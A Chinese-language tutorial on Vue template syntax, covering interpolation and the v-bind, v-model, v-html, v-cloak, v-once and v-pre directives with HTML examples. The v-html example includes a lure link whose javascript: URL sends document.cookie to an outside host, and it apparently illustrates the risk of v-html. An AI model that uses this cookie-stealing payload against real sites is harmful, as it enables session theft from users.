vue分为两种模板语法，插值和指令。

# 插值语法

插值语法用于解析标签体内容，插值语法是`{{xxx}}`，直接读取data中的所有属性，且支持表达式，但不支持js语句。

```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>插值语法</h1>
        <h3>你好，{{name}}</h3>
        <h3>实际年龄：{{age}}</h3>
        <h3>虚岁：{{age+1}}</h3>
    </div>
    <script>
        new Vue({
            el: "#root",
            data: {
                name: 'shanla',
                age: 18,
            }
        })
    </script>
</body>
```

# 指令语法

指令语法用于解析标签，包括：标签属性、标签体内容、绑定事件.....，指令语法是`v-xxx`。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>指令语法</h1>
        <!-- 指令语法中也可以使用表达式 -->
        <a v-bind:href="website.url.toUpperCase()" v-bind:x="hello">点我去{{website.name}}</a>
        <!-- 缩写方式 -->
        <a :href="website.url" x="hello1">点我去{{website.name}}</a>
    </div>
    <script>
        new Vue({
            el: "#root",
            data: {
                website: {
                    name: '百度',
                    url: 'http://www.baidu.com'
                },
                hello: "你好"
            }
        })
    </script>
</body>
</html>
```

### v-bind

用来给标签动态绑定一个或多个属性，`v-bind`属于单向数据绑定，数据只能从data流向页面。

绑定样式可以通过字符串绑定，但这个功能太常用，vue对绑定样式属性进行了增强（class、style），使其可以是数组或对象。

`v-bind`可以缩写成`:`。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>绑定样式</title>
    <style>
        .basic{
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        .normal{
            background-color: skyblue;
        }
        .happy{
            border: 4px solid red;;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg,yellow,pink,orange,yellow);
        }
        .sad{
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }
        .qinghua1{
            background-color: yellowgreen;
        }
        .qinghua2{
            font-size: 30px;
            text-shadow:2px 2px 10px red;
        }
        .qinghua3{
            border-radius: 20px;
        }
    </style>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 字符串写法，适用于：样式的类名不确定，需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
        <!-- 数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
        <div class="basic" :class="classArr">{{name}}</div> <br/><br/>
        <!-- 对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div> <br/><br/>
        <!-- 绑定style样式对象写法 -->
        <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
        <!-- 绑定style样式数组写法 -->
        <div class="basic" :style="styleArr">{{name}}</div>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '清华大学',
                mood: 'normal',
                classArr: ['qinghua1', 'qinghua2', 'qinghua3'],
                classObj: {
                    'qinghua1': true,
                    'qinghua2': true,
                    'qinghua3': false
                },
                styleObj: {
                    fontSize: '40px',
                    color:'red',
                },
                styleArr: [
                    {
                        fontSize: '40px',
                        color:'blue',
                    },
                    {
                        backgroundColor:'gray'
                    }
                ]
            },
            methods: {
                changeMood() {
                    const arr = ['happy','sad','normal']
                    const index = Math.floor(Math.random()*3)
                    this.mood = arr[index]
                }
            }
        })
    </script>
</body>
</html>
```

### v-model

用来表单类元素的数据绑定，`v-model`属于双向数据绑定，表单和data数据相通，变动跟随。

`v-model:value`可以缩写成`v-model`。

```html
<body>
    <!-- 容器 -->
    <div id="root">
        <!-- 普通写法 -->
        双向数据绑定：<input type="text" v-model:value="name"><br>
        <!-- 简写 -->
        双向数据绑定：<input type="text" v-model="name"><br>
    </div>

    <script>
        var vm = new Vue({
            el: '#root',
            data: {
                name: 'hello kitty'
            }
        })
    </script>
</body>
```

### v-html

用来更新元素的html，会按照原生html渲染，vue不会进行编译。

```html
<body>
    <div id="root">
        <div>你好，{{nmame}}</div>
        <div v-html="str"></div>
        <div v-html="str1"></div>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'shanla',
                str: '<h3>你好啊！</h3>',
                str1: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
            }
        })
    </script>
</body>
```

### v-cloak

用来隐藏还未编译完成的DOM模板。

有时候因为加载延时，例如卡掉了，数据没有及时刷新，就造成了页面显示从`{{name}}`到name变量“shanla” 的变化，这样闪动的变化，会造成用户体验不好。

此时需要使用到`v-cloak`的这个标签。在vue解析之前，div属性中有`v-cloak`这个标签，在vue解析完成之后，v-cloak标签被移除。简单，类似div开始有一个css属性`display:none;`，加载完成之后，css属性变成`display:block`，元素显示出来。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-cloak指令</title>
    <style>
        [v-cloak] {
            display: none;
        }
    </style>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2 v-cloak>{{name}}</h2>
    </div>
    <script>
        console.log(1)
        new Vue({
            el:'#root',
            data:{
                name:'shanla'
            }
        })
    </script>
</body>
</html>
```

### v-once

只渲染DOM或组件一次

```html
<body>
    <div id="root">
        <h2 v-once>初始化的n值是:{{n}}</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我+1</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                n: 0
            }
        })
    </script>
</body>
```

### v-pre

跳过元素或其子元素的编译

```html
<body>
    <div id="root">
        <h2 v-pre>{{n}}</h2>
        <h2 >当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                n: 1
            }
        })
    </script>
</body>
```
